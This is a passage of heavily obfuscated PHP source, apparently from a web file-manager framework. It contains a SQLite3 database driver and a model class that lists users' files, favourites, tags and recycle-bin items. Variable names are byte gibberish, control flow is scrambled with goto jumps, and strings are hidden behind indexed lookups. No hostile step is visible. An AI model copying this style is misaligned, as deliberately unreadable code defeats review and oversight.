$a”ÕŠô„[$eÄÍÏ¶Ï‘[12]] = 438; } $this->config = $a”ÕŠô„; if (empty($this->config[$eÄÍÏ¶Ï‘[13]])) { $this->config[$eÄÍÏ¶Ï‘[13]] = array(); } } } public function connect($E¶Òë—Ç¸Å = '', $DÆé–Æ××‹ = 0) { $bğèÌÔ”‘ò =& $_SERVER[Ü˜]; if (!isset($this->linkID[$DÆé–Æ××‹])) { if (empty($E¶Òë—Ç¸Å)) { $E¶Òë—Ç¸Å = $this->config; } $this->linkID[$DÆé–Æ××‹] = new SQLite3($E¶Òë—Ç¸Å[$bğèÌÔ”‘ò[17]]); if (!$this->linkID[$DÆé–Æ××‹]) { think_exception($this->linkID[$DÆé–Æ××‹]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$DÆé–Æ××‹]->busyTimeout(30000); if (1 != think_config($bğèÌÔ”‘ò[18])) { unset($this->config); } } return $this->linkID[$DÆé–Æ××‹]; } public function free() { $this->queryID = null; } public function query($eŒ÷¸¢¾”) { goto B£òšØ××š; dâ§š¬è„»: $this->queryStr = $eŒ÷¸¢¾”; if ($this->queryID) { $this->free(); } think_action_status($A²Û®°ÑÖè[19], 1); goto C›Š’¼ˆ’; AÊ·•£Ôì©: if (!1 === $this->queryID) { $this->error(); return !1; } else { $Eãôõ¸Ù‚ = $this->getAll(); $this->numRows = count($Eãôõ¸Ù‚); return $Eãôõ¸Ù‚; } goto dñò²›Š¨²; B£òšØ××š: $A²Û®°ÑÖè =& $_SERVER[Ü˜]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto dâ§š¬è„»; C›Š’¼ˆ’: think_status($A²Û®°ÑÖè[20]); $this->queryID = $this->_linkID->query($eŒ÷¸¢¾”); $this->debug(); goto AÊ·•£Ôì©; dñò²›Š¨²: } public function execute($A®‡¿ç†) { goto dÄ”Ø®ÌöÜ; bğÍæ ‹—: if (!1 === $CÉ‡âŸÇº) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto Fƒß«ê»¥; Ağùô¯àœÌ: think_status($FŒ¼÷”˜‹“[20]); $CÉ‡âŸÇº = $this->_linkID->exec($A®‡¿ç†); $this->debug(); goto bğÍæ ‹—; C—¯îÌ¯†: $this->queryStr = $A®‡¿ç†; if ($this->queryID) { $this->free(); } think_action_status($FŒ¼÷”˜‹“[21], 1); goto Ağùô¯àœÌ; dÄ”Ø®ÌöÜ: $FŒ¼÷”˜‹“ =& $_SERVER[Ü˜]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto C—¯îÌ¯†; Fƒß«ê»¥: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Ü˜][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $D¡ãÇ¡ÑàÛ = $this->_linkID->query($_SERVER[Ü˜][23]); if (!$D¡ãÇ¡ÑàÛ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $D¡ØÇñÎê» = $this->_linkID->query($_SERVER[Ü˜][24]); if (!$D¡ØÇñÎê») { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $cÅ¦Ù¶º¤ò = array(); while ($AÈ¼ ŞÉÍó = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $cÅ¦Ù¶º¤ò[] = $AÈ¼ ŞÉÍó; } $this->queryID->reset(); return $cÅ¦Ù¶º¤ò; } public function getFields($D•²šÁĞÁ) { $aÑÙ©ó—Î =& $_SERVER[Ü˜]; $bî°ˆ…í›Ù = $this->query($aÑÙ©ó—Î[25] . $D•²šÁĞÁ . $aÑÙ©ó—Î[26]); $AÛÛ¯”ä‚Ï = array(); if ($bî°ˆ…í›Ù) { foreach ($bî°ˆ…í›Ù as $aŸß¡–àéİ => $dƒÄ³É²õ¼) { $AÛÛ¯”ä‚Ï[$dƒÄ³É²õ¼[$aÑÙ©ó—Î[28]]] = array($aÑÙ©ó—Î[28] => $dƒÄ³É²õ¼[$aÑÙ©ó—Î[28]], $aÑÙ©ó—Î[29] => $dƒÄ³É²õ¼[$aÑÙ©ó—Î[29]], $aÑÙ©ó—Î[31] => (bool) ($dƒÄ³É²õ¼[$aÑÙ©ó—Î[31]] === $aÑÙ©ó—Î[33]), $aÑÙ©ó—Î[34] => $dƒÄ³É²õ¼[$aÑÙ©ó—Î[53]], $aÑÙ©ó—Î[36] => (bool) $dƒÄ³É²õ¼[$aÑÙ©ó—Î[54]], $aÑÙ©ó—Î[39] => (bool) $dƒÄ³É²õ¼[$aÑÙ©ó—Î[54]]); } } return $AÛÛ¯”ä‚Ï; } public function getTables($dô¹ä†ƒ¶ = '') { $a½ÊŒé¹ˆù =& $_SERVER[Ü˜]; $f´…˜ÎÕİµ = $this->query($a½ÊŒé¹ˆù[42] . $a½ÊŒé¹ˆù[43] . $a½ÊŒé¹ˆù[44]); $F•ßËÆ¦Á• = array(); foreach ($f´…˜ÎÕİµ as $b–îº™‘š¢ => $d¾Ñ…ùÈŠ) { $F•ßËÆ¦Á•[$b–îº™‘š¢] = current($d¾Ñ…ùÈŠ); } return $F•ßËÆ¦Á•; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $E‘½À™“Î¸ =& $_SERVER[Ü˜]; $this->error = $this->_linkID->lastErrorMsg(); if ($E‘½À™“Î¸[33] != $this->queryStr) { $this->error .= LNG($E‘½À™“Î¸[45]) . $this->queryStr; } think_trace($this->error, $E‘½À™“Î¸[33], $E‘½À™“Î¸[46]); return $this->error; } public function escapeString($BŒ˜Ø›Ñó) { $E»¯Š·²È… =& $_SERVER[Ü˜]; if ($this->_linkID) { return $this->_linkID->escapeString($BŒ˜Ø›Ñó); } return str_ireplace($E»¯Š·²È…[55], $E»¯Š·²È…[56], $BŒ˜Ø›Ñó); } public function parseLimit($eÜŠ¼èöƒ) { $DÕí’Ù¾• =& $_SERVER[Ü˜]; $dÔ¨ÓßÕö = $DÕí’Ù¾•[33]; if (!empty($eÜŠ¼èöƒ)) { $eÜŠ¼èöƒ = explode($DÕí’Ù¾•[47], $eÜŠ¼èöƒ); if (count($eÜŠ¼èöƒ) > 1) { $dÔ¨ÓßÕö .= $DÕí’Ù¾•[48] . $eÜŠ¼èöƒ[1] . $DÕí’Ù¾•[49] . $eÜŠ¼èöƒ[0] . $DÕí’Ù¾•[50]; } else { $dÔ¨ÓßÕö .= $DÕí’Ù¾•[48] . $eÜŠ¼èöƒ[0] . $DÕí’Ù¾•[50]; } } return $dÔ¨ÓßÕö; } } goto f¡’‘†Õæ³; C–Ãç«‰ä: class SourceListModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\165\162\x63\145"; protected $tableMeta = array("\x74\141\142\154\x65\116\x61\x6d\145" => "\x69\x6f\137\163\x6f\165\162\143\x65\x5f\155\x65\164\141", "\x6d\145\x74\141\106\x69\145\154\144" => "\163\157\x75\x72\143\x65\111\x44"); protected $dataAuto = array(array("\155\x6f\144\151\x66\171\x54\x69\x6d\x65", "\x74\151\155\145", "\x69\156\x73\x65\x72\164", "\146\165\x6e\x63\x74\151\157\156"), array("\x63\162\x65\141\164\x65\124\151\x6d\x65", "\x74\x69\x6d\145", "\x69\x6e\x73\145\162\x74", "\x66\x75\x6e\143\x74\151\x6f\156"), array("\166\x69\x65\x77\x54\151\155\x65", "\164\x69\x6d\x65", "\151\x6e\x73\145\162\164", "\146\x75\156\x63\164\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($eâ…ë²ÌÁî) { return $this->listSource(array($_SERVER[Ü˜][403] => $eâ…ë²ÌÁî)); } public function typeName($dõ÷éÁ´íŠ) { static $C¥íåƒ¸í = array(self::TYPE_SYSTEM => "\x73\171\x73\x74\x65\x6d", self::TYPE_USER => "\x75\x73\145\162", self::TYPE_GROUP => "\147\x72\x6f\x75\x70"); return $C¥íåƒ¸í[$dõ÷éÁ´íŠ . $_SERVER[Ü˜][33]]; } public function sourceListInfo($aÏÏÃåå, $BÒÔ¥íá„Ñ = false) { goto EãÀÔÈ™å‡; EãÀÔÈ™å‡: $c½°Ù¸ƒ =& $_SERVER[Ü˜]; $aÏÏÃåå = $aÏÏÃåå ? $aÏÏÃåå : array(); $aÏÏÃåå = array_filter(array_unique($aÏÏÃåå)); goto C­Æµë‰ªù; Dôˆê·Âµ: return array_to_keyvalue($eÅÛ¤îÀ¯, $c½°Ù¸ƒ[404]); goto D²ïÜïñ; C­Æµë‰ªù: if (!$aÏÏÃåå) { return array(); } $eÅÛ¤îÀ¯ = $this->where(array($c½°Ù¸ƒ[404] => array($c½°Ù¸ƒ[7], $aÏÏÃåå)))->select(); $this->_listDataApply($eÅÛ¤îÀ¯, $BÒÔ¥íá„Ñ); goto Dôˆê·Âµ; D²ïÜïñ: } public function pathInfoFilter(&$f‘µªŠÅ¶ò) { goto f¶Áİ¼»ƒÔ; BÓ¿ö¯Ê ¾: static $E®ëÙØ¬ = false; if (!$Aàë¹ ×ìß) { goto a·Íô÷; A°¢ù§–ÇŠ: $bóİµ¼õã¬ = array(); foreach ($Aàë¹ ×ìß as $FÕí¤ˆ¡Š) { if (in_array($FÕí¤ˆ¡Š, $Aò¢íÉÏÂ›)) { continue; } $bóİµ¼õã¬[] = $FÕí¤ˆ¡Š; } $E®ëÙØ¬ = explode($c´—œ­•‚Â[47], $c´—œ­•‚Â[409]); goto AôØÖŒÓÀ‚; a·Íô÷: $aâµ¾‘²Ò¢ = $c´—œ­•‚Â[405]; $aâµ¾‘²Ò¢ .= $c´—œ­•‚Â[406]; $aâµ¾‘²Ò¢ .= $c´—œ­•‚Â[407]; goto FŠêËñÉÓˆ; FŠêËñÉÓˆ: $bòãªÂãµß = $c´—œ­•‚Â[408]; $Aò¢íÉÏÂ› = explode($c´—œ­•‚Â[47], $bòãªÂãµß); $Aàë¹ ×ìß = explode($c´—œ­•‚Â[47], $aâµ¾‘²Ò¢); goto A°¢ù§–ÇŠ; AôØÖŒÓÀ‚: } foreach ($E®ëÙØ¬ as $a¬Õ‡¬—ó—) { if (isset($f‘µªŠÅ¶ò[$a¬Õ‡¬—ó—])) { $f‘µªŠÅ¶ò[$a¬Õ‡¬—ó—] = intval($f‘µªŠÅ¶ò[$a¬Õ‡¬—ó—]); } } goto eÔè†ÑÁÓÕ; dÈ¡‰¼×¶å: $f‘µªŠÅ¶ò = array_field_key($f‘µªŠÅ¶ò, $däØçßÏ‘); return $f‘µªŠÅ¶ò; goto Aõàô¹”¤“; f¶Áİ¼»ƒÔ: $c´—œ­•‚Â =& $_SERVER[Ü˜]; static $Aàë¹ ×ìß = false; static $bóİµ¼õã¬ = false; goto BÓ¿ö¯Ê ¾; eÔè†ÑÁÓÕ: $f‘µªŠÅ¶ò[$c´—œ­•‚Â[86]] = $c´—œ­•‚Â[410] . $f‘µªŠÅ¶ò[$c´—œ­•‚Â[404]] . $c´—œ­•‚Â[411]; $f‘µªŠÅ¶ò[$c´—œ­•‚Â[29]] = $f‘µªŠÅ¶ò[$c´—œ­•‚Â[412]] == 1 ? $c´—œ­•‚Â[87] : $c´—œ­•‚Â[203]; $f‘µªŠÅ¶ò[$c´—œ­•‚Â[413]] = $this->typeName($f‘µªŠÅ¶ò[$c´—œ­•‚Â[413]]); goto d—‡›åòÊª; d—‡›åòÊª: if ($f‘µªŠÅ¶ò[$c´—œ­•‚Â[412]] != 1) { $f‘µªŠÅ¶ò[$c´—œ­•‚Â[178]] = $f‘µªŠÅ¶ò[$c´—œ­•‚Â[414]]; unset($f‘µªŠÅ¶ò[$c´—œ­•‚Â[414]]); } $däØçßÏ‘ = $Aàë¹ ×ìß; if (isset($f‘µªŠÅ¶ò[$c´—œ­•‚Â[415]]) && $f‘µªŠÅ¶ò[$c´—œ­•‚Â[415]][$c´—œ­•‚Â[416]] == -1) { $däØçßÏ‘ = $bóİµ¼õã¬; } goto dÈ¡‰¼×¶å; Aõàô¹”¤“: } public function listUserFav() { goto cË˜‹•Ù˜¼; bÏé±ŠŒ½¥: foreach ($bŒî¼‹–‰¥ as &$aÃÓßª®¤‘) { $aÃÓßª®¤‘ = array($eØ­Ó¶ò¢‰[421] => $aÃÓßª®¤‘[$eØ­Ó¶ò¢‰[402]], $eØ­Ó¶ò¢‰[422] => $aÃÓßª®¤‘[$eØ­Ó¶ò¢‰[28]], $eØ­Ó¶ò¢‰[423] => $aÃÓßª®¤‘[$eØ­Ó¶ò¢‰[86]], $eØ­Ó¶ò¢‰[424] => $aÃÓßª®¤‘[$eØ­Ó¶ò¢‰[29]], $eØ­Ó¶ò¢‰[425] => $aÃÓßª®¤‘[$eØ­Ó¶ò¢‰[204]], $eØ­Ó¶ò¢‰[426] => $aÃÓßª®¤‘[$eØ­Ó¶ò¢‰[94]]); if ($aÃÓßª®¤‘[$eØ­Ó¶ò¢‰[29]] == $eØ­Ó¶ò¢‰[418] && $D‘¯µ½Š¶š[$aÃÓßª®¤‘[$eØ­Ó¶ò¢‰[86]]]) { $aÃÓßª®¤‘[$eØ­Ó¶ò¢‰[95]] = $D‘¯µ½Š¶š[$aÃÓßª®¤‘[$eØ­Ó¶ò¢‰[86]]]; } } unset($aÃÓßª®¤‘); return $bŒî¼‹–‰¥; goto FÍÕÊÓ‹®; cË˜‹•Ù˜¼: $eØ­Ó¶ò¢‰ =& $_SERVER[Ü˜]; $bŒî¼‹–‰¥ = Model($eØ­Ó¶ò¢‰[417])->listData(); $fÚ‹ ò¸ø— = array_filter_by_field($bŒî¼‹–‰¥, $eØ­Ó¶ò¢‰[29], $eØ­Ó¶ò¢‰[418]); goto b± ¯©Ÿñ; b± ¯©Ÿñ: $fÚ‹ ò¸ø— = array_to_keyvalue($fÚ‹ ò¸ø—, $eØ­Ó¶ò¢‰[33], $eØ­Ó¶ò¢‰[86]); if ($fÚ‹ ò¸ø—) { $D‘¯µ½Š¶š = $this->listSource(array($eØ­Ó¶ò¢‰[419] => array($eØ­Ó¶ò¢‰[420], $fÚ‹ ò¸ø—))); } $D‘¯µ½Š¶š = array_to_keyvalue($D‘¯µ½Š¶š[$eØ­Ó¶ò¢‰[376]], $eØ­Ó¶ò¢‰[404]); goto bÏé±ŠŒ½¥; FÍÕÊÓ‹®: } public function listUserTag($A“¨Ûíáæ) { goto CÂîÃÏ…¯º; Eæ²¬¹¢î–: if ($F§Â²¤©§) { Model($AÑ»¯îâ—…[429])->removeBySource($F§Â²¤©§); } return $A‰¥‰š½˜Ø; goto f½™¹Œ¯Ï; BçŠÊ–°ƒó: foreach ($Cµ„¢©ÚôÚ as $BïÈ¿Ä–—Â => $eÎÒ¾ÔÊÏå) { $DÊéÊöï¶œ = !0; if (!$A“¨Ûíáæ) { $F¹˜’‹‘‘¡[] = $BïÈ¿Ä–—Â; continue; } foreach ($A“¨Ûíáæ as $E¤³Õçôà·) { if (!in_array($E¤³Õçôà·, $eÎÒ¾ÔÊÏå)) { $DÊéÊöï¶œ = !1; break; } } if ($DÊéÊöï¶œ) { $F¹˜’‹‘‘¡[] = $BïÈ¿Ä–—Â; } } if (!$F¹˜’‹‘‘¡) { return array(); } $A‰¥‰š½˜Ø = $this->listSource(array($AÑ»¯îâ—…[419] => array($AÑ»¯îâ—…[420], $F¹˜’‹‘‘¡))); goto FèìîÑ¨ÕÖ; f‡ÒØÈæ–—: $Cµ„¢©ÚôÚ = array(); foreach ($d‹È¢Œ‰“¥ as $a‰÷æåÄÏ„) { $aÀ²¼Š¹ˆŠ = $a‰÷æåÄÏ„[$AÑ»¯îâ—…[86]]; if (!$aÀ²¼Š¹ˆŠ) { continue; } if (!isset($Cµ„¢©ÚôÚ[$aÀ²¼Š¹ˆŠ])) { $Cµ„¢©ÚôÚ[$aÀ²¼Š¹ˆŠ] = array(); } $Cµ„¢©ÚôÚ[$aÀ²¼Š¹ˆŠ][] = $a‰÷æåÄÏ„[$AÑ»¯îâ—…[428]]; } $F¹˜’‹‘‘¡ = array(); goto BçŠÊ–°ƒó; CÂîÃÏ…¯º: $AÑ»¯îâ—… =& $_SERVER[Ü˜]; if ($A“¨Ûíáæ && !is_array($A“¨Ûíáæ)) { $A“¨Ûíáæ = array($A“¨Ûíáæ); } $d‹È¢Œ‰“¥ = Model($AÑ»¯îâ—…[427])->listData(); goto f‡ÒØÈæ–—; FèìîÑ¨ÕÖ: if (!$A‰¥‰š½˜Ø || count($F¹˜’‹‘‘¡) == $A‰¥‰š½˜Ø[$AÑ»¯îâ—…[373]][$AÑ»¯îâ—…[374]]) { return $A‰¥‰š½˜Ø; } $F§Â²¤©§ = array(); $EÉ‡ê¤™İ = array_to_keyvalue($A‰¥‰š½˜Ø[$AÑ»¯îâ—…[85]], $AÑ»¯îâ—…[33], $AÑ»¯îâ—…[404]); goto e×­ƒ·‰Æ; e×­ƒ·‰Æ: $dÇ·•èÇŠ = array_to_keyvalue($A‰¥‰š½˜Ø[$AÑ»¯îâ—…[84]], $AÑ»¯îâ—…[33], $AÑ»¯îâ—…[404]); $dŸÒåóš = array_merge($dÇ·•èÇŠ, $EÉ‡ê¤™İ); foreach ($F¹˜’‹‘‘¡ as $aÀ²¼Š¹ˆŠ) { if (!in_array($aÀ²¼Š¹ˆŠ, $dŸÒåóš)) { $F§Â²¤©§[] = $aÀ²¼Š¹ˆŠ; } } goto Eæ²¬¹¢î–; f½™¹Œ¯Ï: } public function listUserRecycle() { $C‡“ĞÆ‹°¸ =& $_SERVER[Ü˜]; $CÃÕ»ìº°ƒ = Model($C‡“ĞÆ‹°¸[430])->listData(); if (!$CÃÕ»ìº°ƒ) { return array(); } $c·³Ö´Ü·Í = array($C‡“ĞÆ‹°¸[419] => array($C‡“ĞÆ‹°¸[420], $CÃÕ»ìº°ƒ), $C‡“ĞÆ‹°¸[431] => 1); return $this->listSource($c·³Ö´Ü·Í); } public function listSource($fÏŸ¶·‘ÓÑ, $b®ÂËç¤î = 3000) { goto e‰£ÜÊÇá§; b¡‹÷È­Öê: $F³¦—…”Ã¿ = $this->field($E“¸™çéˆë)->_makeOrder()->where($fÏŸ¶·‘ÓÑ)->selectPage($b®ÂËç¤î); $this->_listDataApply($F³¦—…”Ã¿[$F¡«Û‹–¬Æ[376]]); $this->_listMake($F³¦—…”Ã¿); goto BôÊÉÎİ¸•; e‰£ÜÊÇá§: $F¡«Û‹–¬Æ =& $_SERVER[Ü˜]; if (!isset($fÏŸ¶·‘ÓÑ[$F¡«Û‹–¬Æ[432]])) { $fÏŸ¶·‘ÓÑ[$F¡«Û‹–¬Æ[432]] = 0; } $E“¸™çéˆë = $F¡«Û‹–¬Æ[433]; goto b¡‹÷È­Öê; BôÊÉÎİ¸•: return $F³¦—…”Ã¿; goto eÄÉ²÷ßÄ; eÄÉ²÷ßÄ: } protected function _makeOrder() { goto dñäÛ×´‘Ó; E°Ñ…ˆÙ¥: if ($C¨Íªª³Í° == $D‡ÁØéé¤°[28]) { } $bìã”ë‰ïÓ = $D‡ÁØéé¤°[446] . $föŠŠĞÚ¿»[$C¨Íªª³Í°] . $D‡ÁØéé¤°[50] . $f²íôœÃ‰ª[$A¹µÁÂÄª˜]; return $this->order(rtrim(trim($bìã”ë‰ïÓ), $D‡ÁØéé¤°[47])); goto C¼‡‹Ÿµå; e†§«æ‚–: $A¹µÁÂÄª˜ = Input::get($D‡ÁØéé¤°[445], $D‡ÁØéé¤°[7], $eÅ‰‚æÖØ, array_keys($f²íôœÃ‰ª)); if (!in_array($C¨Íªª³Í°, array_keys($föŠŠĞÚ¿»))) { $C¨Íªª³Í° = $D‡ÁØéé¤°[28]; } if (!in_array($A¹µÁÂÄª˜, array_keys($f²íôœÃ‰ª))) { $C¨Íªª³Í° = $D‡ÁØéé¤°[437]; } goto E°Ñ…ˆÙ¥; c‘èÒ’ô¢Ÿ: $f²íôœÃ‰ª = array($D‡ÁØéé¤°[437] => $D‡ÁØéé¤°[438], $D‡ÁØéé¤°[439] => $D‡ÁØéé¤°[440]); $föŠŠĞÚ¿» = array($D‡ÁØéé¤°[28] => $D‡ÁØéé¤°[28], $D‡ÁØéé¤°[88] => $D‡ÁØéé¤°[88], $D‡ÁØéé¤°[178] => $D‡ÁØéé¤°[414], $D‡ÁØéé¤°[441] => $D‡ÁØéé¤°[441], $D‡ÁØéé¤°[442] => $D‡ÁØéé¤°[443], $D‡ÁØéé¤°[204] => $D‡ÁØéé¤°[204], $D‡ÁØéé¤°[94] => $D‡ÁØéé¤°[94]); $C¨Íªª³Í° = Input::get($D‡ÁØéé¤°[444], $D‡ÁØéé¤°[7], $aèìî†æ„ƒ, array_keys($föŠŠĞÚ¿»)); goto e†§«æ‚–; dñäÛ×´‘Ó: $D‡ÁØéé¤° =& $_SERVER[Ü˜]; $aèìî†æ„ƒ = Model($D‡ÁØéé¤°[434])->get($D‡ÁØéé¤°[435]); $eÅ‰‚æÖØ = Model($D‡ÁØéé¤°[434])->get($D‡ÁØéé¤°[436]); goto c‘èÒ’ô¢Ÿ; C¼‡‹Ÿµå: } protected function _listDataApplyItem($Dóæ·¬­, $Cœ•¿Å‚ = false) { $a™ãíçÀÌ© = array($Dóæ·¬­); $this->_listDataApply($a™ãíçÀÌ©, $Cœ•¿Å‚); return $a™ãíçÀÌ©[0]; } protected function _listDataApply(&$CŠ×æ¾ˆÀŠ, $a·ó”ÑÜŠæ = false) { goto Bè£ëŒ …; eÑ„çåŒ©: $this->_listAppendUser($CŠ×æ¾ˆÀŠ); $this->_listFilterInfo($CŠ×æ¾ˆÀŠ, $a·ó”ÑÜŠæ); goto e•ÊäÑ¯£ ; Fñö„ôÖòâ: $this->_listAppendPath($CŠ×æ¾ˆÀŠ); $this->_listAppendAuth($CŠ×æ¾ˆÀŠ); $this->_listAppendSourceInfo($CŠ×æ¾ˆÀŠ, $bõ˜ÜËÀø´); goto eÑ„çåŒ©; Bè£ëŒ …: $A¶ô‘ËõŸ =& $_SERVER[Ü˜]; if (!$CŠ×æ¾ˆÀŠ) { $CŠ×æ¾ˆÀŠ = array(); return; } $bõ˜ÜËÀø´ = array_to_keyvalue($CŠ×æ¾ˆÀŠ, $A¶ô‘ËõŸ[33], $A¶ô‘ËõŸ[404]); goto f£Ç‹¼ëëë; f£Ç‹¼ëëë: $bõ˜ÜËÀø´ = array_unique($bõ˜ÜËÀø´); $this->_listSourceCache($CŠ×æ¾ˆÀŠ); if (!$a·ó”ÑÜŠæ) { $this->_listAppendMeta($CŠ×æ¾ˆÀŠ, $bõ˜ÜËÀø´); $this->_listAppendFileMeta($CŠ×æ¾ˆÀŠ, $bõ˜ÜËÀø´); $this->_listAppendChildren($CŠ×æ¾ˆÀŠ, $bõ˜ÜËÀø´); } goto Fñö„ôÖòâ; e•ÊäÑ¯£ : } protected function _listSourceCache($F‹±ò³ Ù) { $CÂ™¤¤Èø =& $_SERVER[Ü˜]; foreach ($F‹±ò³ Ù as $f•õïÊ­ˆ¾) { self::$cacheSourceInfo[$CÂ™¤¤Èø[447] . $f•õïÊ­ˆ¾[$CÂ™¤¤Èø[404]]] = $f•õïÊ­ˆ¾; } } protected function _listFilterInfo(&$Aµ‡™ÎÛØ, $D—±Ë˜²Ü = false) { $aáœ‹‹×¹ =& $_SERVER[Ü˜]; foreach ($Aµ‡™ÎÛØ as &$F¢ô¬Ÿîá) { $F¢ô¬Ÿîá = $this->pathInfoFilter($F¢ô¬Ÿîá); self::$cachePathInfo[$aáœ‹‹×¹[448] . intval($D—±Ë˜²Ü) . $aáœ‹‹×¹[449] . $F¢ô¬Ÿîá[$aáœ‹‹×¹[404]]] = $F¢ô¬Ÿîá; } unset($F¢ô¬Ÿîá); } protected function _listMake(&$bĞõ¦¤Ş¤) { $D¯…ï•–º­ =& $_SERVER[Ü˜]; $bĞõ¦¤Ş¤[$D¯…ï•–º­[85]] = array(); $bĞõ¦¤Ş¤[$D¯…ï•–º­[84]] = array(); foreach ($bĞõ¦¤Ş¤[$D¯…ï•–º­[376]] as $e¾¸‹Ì¦­Å) { $Aø•§å»îå = $e¾¸‹Ì¦­Å[$D¯…ï•–º­[412]] == 1 ? $D¯…ï•–º­[85] : $D¯…ï•–º­[84]; $bĞõ¦¤Ş¤[$Aø•§å»îå][] = $e¾¸‹Ì¦­Å; } unset($bĞõ¦¤Ş¤[$D¯…ï•–º­[376]]); } protected function _listAppendMeta(&$DÔ”«£Ï, $eì÷àÔ† ) { goto døÆ®Àäî÷; a‡ùÄ•ÜÇ¬: if (!$AÔ’›ßºëà) { return; } $A´«ËñôãÎ = array($fÏ£…ÇÄÚó[452], $fÏ£…ÇÄÚó[453]); $EÜÎ¯Ò¿ò‰ = array(); goto EÖøİöÜ¸; EÖøİöÜ¸: foreach ($AÔ’›ßºëà as $BíÔ„‰”ˆï) { if (!isset($EÜÎ¯Ò¿ò‰[$BíÔ„‰”ˆï[$fÏ£…ÇÄÚó[404]]])) { $EÜÎ¯Ò¿ò‰[$BíÔ„‰”ˆï[$fÏ£…ÇÄÚó[404]]] = array(); } if (in_array($BíÔ„‰”ˆï[$fÏ£…ÇÄÚó[103]], $A´«ËñôãÎ)) { continue; } $EÜÎ¯Ò¿ò‰[$BíÔ„‰”ˆï[$fÏ£…ÇÄÚó[404]]][$BíÔ„‰”ˆï[$fÏ£…ÇÄÚó[103]]] = $BíÔ„‰”ˆï[$fÏ£…ÇÄÚó[381]]; } foreach ($DÔ”«£Ï as &$cÊùÈ¯©‡) { $cÊùÈ¯©‡[$fÏ£…ÇÄÚó[454]] = !1; if (isset($EÜÎ¯Ò¿ò‰[$cÊùÈ¯©‡[$fÏ£…ÇÄÚó[404]]])) { $cÊùÈ¯©‡[$fÏ£…ÇÄÚó[454]] = $EÜÎ¯Ò¿ò‰[$cÊùÈ¯©‡[$fÏ£…ÇÄÚó[404]]]; } if ($this->fileIsLock($cÊùÈ¯©‡) && $cÊùÈ¯©‡[$fÏ£…ÇÄÚó[415]]) { $Fã¢Œ®Ä—® = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $cÊùÈ¯©‡[$fÏ£…ÇÄÚó[415]][$fÏ£…ÇÄÚó[416]] = AuthModel::authDisable($cÊùÈ¯©‡[$fÏ£…ÇÄÚó[415]][$fÏ£…ÇÄÚó[416]], $Fã¢Œ®Ä—®); $cÊùÈ¯©‡[$fÏ£…ÇÄÚó[415]][$fÏ£…ÇÄÚó[455]][$fÏ£…ÇÄÚó[415]] = $cÊùÈ¯©‡[$fÏ£…ÇÄÚó[415]][$fÏ£…ÇÄÚó[416]]; } } unset($cÊùÈ¯©‡); goto B»¤™¼Îì; døÆ®Àäî÷: $fÏ£…ÇÄÚó =& $_SERVER[Ü˜]; $FÚ÷æèÍ²£ = array($fÏ£…ÇÄÚó[419] => array($fÏ£…ÇÄÚó[420], $eì÷àÔ† )); $AÔ’›ßºëà = Model($fÏ£…ÇÄÚó[450])->field($fÏ£…ÇÄÚó[451])->where($FÚ÷æèÍ²£)->select(); goto a‡ùÄ•ÜÇ¬; B»¤™¼Îì: } protected function _listAppendFileMeta(&$fÏÒõİ–ó, $cäô¤¥ÉôÈ) { goto EØÛÛÃê„Â; eè‰Ò˜šä¼: foreach ($fÏÒõİ–ó as &$EßñÍê˜Ç) { goto Aƒ„ôÀ; BÇÃ¨›²á‚: if (isset($EßñÍê˜Ç[$BÙÅãÇ«”“[174]][$BÙÅãÇ«”“[173]])) { $EßñÍê˜Ç[$BÙÅãÇ«”“[173]] = json_decode($EßñÍê˜Ç[$BÙÅãÇ«”“[174]][$BÙÅãÇ«”“[173]], !0); unset($EßñÍê˜Ç[$BÙÅãÇ«”“[174]][$BÙÅãÇ«”“[173]]); } goto eÎ‡®ÒÒì; e¦Şİ‚‚´Ÿ: $D¹ÁİÉÂ[$BÙÅãÇ«”“[88]] = $EßñÍê˜Ç[$BÙÅãÇ«”“[88]]; $D¹ÁİÉÂ[$BÙÅãÇ«”“[28]] = $EßñÍê˜Ç[$BÙÅãÇ«”“[28]]; if (!isset(self::$cacheFileInfo[$BÙÅãÇ«”“[462] . $EÃöºŠÒ‡Ï])) { self::$cacheFileInfo[$BÙÅãÇ«”“[462] . $EÃöºŠÒ‡Ï] = array_merge(array(), $D¹ÁİÉÂ); } goto A×¶Ê—ÆàŸ; Aƒ„ôÀ: $EÃöºŠÒ‡Ï = $EßñÍê˜Ç[$BÙÅãÇ«”“[456]]; if (!$EÃöºŠÒ‡Ï || !is_array($fó¿¡ÃŞ¼°[$EÃöºŠÒ‡Ï])) { continue; } $D¹ÁİÉÂ = $fó¿¡ÃŞ¼°[$EÃöºŠÒ‡Ï]; goto e¦Şİ‚‚´Ÿ; A×¶Ê—ÆàŸ: unset($fó¿¡ÃŞ¼°[$EÃöºŠÒ‡Ï][$BÙÅãÇ«”“[86]]); $dã·³ğ‡„‘ = is_array($bì­¢šÎÍä[$EÃöºŠÒ‡Ï]) ? $bì­¢šÎÍä[$EÃöºŠÒ‡Ï] : array(); $EßñÍê˜Ç[$BÙÅãÇ«”“[174]] = array_merge($dã·³ğ‡„‘, $fó¿¡ÃŞ¼°[$EÃöºŠÒ‡Ï]); goto BÇÃ¨›²á‚; eÎ‡®ÒÒì: } unset($EßñÍê˜Ç); goto c Ÿ‚êÛÈ; D°ÒßÀ½ôÛ: if (!$B·ˆ†ó±‚Ø) { return; } $a‰ˆãêåõô = array($BÙÅãÇ«”“[457] => array($BÙÅãÇ«”“[420], $B·ˆ†ó±‚Ø)); $cœƒ“à§†… = $BÙÅãÇ«”“[458]; goto 